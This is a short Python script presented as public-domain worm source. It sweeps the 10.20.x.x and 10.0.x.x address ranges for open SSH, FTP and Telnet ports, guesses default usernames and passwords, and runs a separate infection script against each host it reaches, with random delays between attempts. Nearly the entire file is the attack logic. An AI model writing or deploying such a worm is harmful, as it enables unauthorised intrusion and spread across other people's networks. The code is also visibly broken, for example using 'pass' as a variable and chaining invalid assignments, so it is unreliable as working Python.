#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#/*
#* .wormy.py
#*
#* This is free and unencumbered software released into the public domain.
#*
#* Anyone is free to copy, modify, publish, use, compile, sell, or distribute this software, either in source code form or as a compiled binary, for any purpose, commercial or non-commercial, and by any means.
#*
#* In jurisdictions that recognize copyright laws, the author or authors of this software dedicate any and all copyright interest in the software to the public domain. We make this dedication for the benefit of the public at large and to the detriment of our heirs and successors. We intend this dedication to be an overt act of relinquishment in perpetuity of all present and future rights to this software under copyright law.
#* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#* For more information, please refer to http://unlicense.org
#* 
#* 
#*/ 

# May or may not work.

def sub():
  os.system('echo \"pop box\">~/boxy.log')
  return

def server_Outgoing(argument):
  arguments = argument
  port = argument.port
  address = argument.address
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.settimeout(5)
  try:
    s.connect((address, port))
  except socket.error, exc:
    return 0
  s.close()
  return 1

def main(args):
  sub()
  ij = [10, 20]
  c = 0
  maxWait = 30
  maxTryPerSequence = 2
  command = ""
  pa = [22, 21, 23]
  userlist = ["root","admin","administrater"]
  passlist = ["root", "password", "", "admin"]
  user = ""
  pass = ""
  infectionCode = ["~/.wormys.sh"]
  i = 0, j = 0, p = 0, k = 0, h = 0
  for h in range(0, 2):
    for i in range(0, 254):
      for j in range(0, 254):
        for p in range(0, len(pa)):
          command = ""
          argumentsOutgoing = serverConnectionFunction()
          argumentsOutgoing.port = pa[p]
          argumentsOutgoing.address = "{}.{}.{}.{}".format(ij[0], ij[1], i, j)
          if server_Outgoing(argumentsOutgoing) is 1:
            for k in range(0, maxTryPerSequence):
              user = ""
              pass = ""
              user = userlist[randint(0, len(userlist))]
              pass = passlist[randint(0, len(passlist))]
              command = ""
              if pa[p] is 22:
                command = "{} ssh".format(infectionCode[0])
              elif pa[p] is 21:
                command = "{} ftp".format(infectionCode[0])
              elif pa[p] is 23:
                command = "{} telnet".format(infectionCode[0])
              command = "{} {} {} {}.{}.{}.{}".format(command, user, pass, ij[0], ij[1], i, j)
              
              os.system(command)
              time.sleep(randint(0, maxWait/2))
          time.sleep(randint(0, maxWait/2))
        time.sleep(randint(0, maxWait/2))
    if c is 0:
      c = 1
      ij = [10, 0]
  user = ""
  pass = ""
  command = ""
  return 0
	
if __name__ == '__main__':
    import sys
    import socket
    import os
    import time
    class serverConnectionFunction:
      port = 0
      address = ""
    
    sys.exit(main(sys.argv))
